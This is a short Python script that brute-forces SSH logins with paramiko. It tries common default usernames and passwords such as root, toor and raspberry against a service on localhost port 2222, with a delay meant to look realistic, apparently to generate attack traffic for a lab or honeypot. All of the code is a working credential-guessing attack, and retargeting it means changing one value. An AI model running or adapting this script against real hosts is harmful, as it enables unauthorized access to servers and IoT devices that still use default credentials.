import paramiko
import time

HOST = "127.0.0.1"
PORT = 2222

usernames = ["root", "admin", "test", "iotadmin"]
passwords = ["123456", "password", "toor", "admin123", "raspberry"]

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

for user in usernames:
    for pwd in passwords:
        try:
            print(f"[*] Trying {user}:{pwd}")
            client.connect(
                HOST,
                port=PORT,
                username=user,
                password=pwd,
                timeout=3,
                allow_agent=False,
                look_for_keys=False
            )
        except Exception:
            pass
        time.sleep(1)   # VERY IMPORTANT (realistic delay)
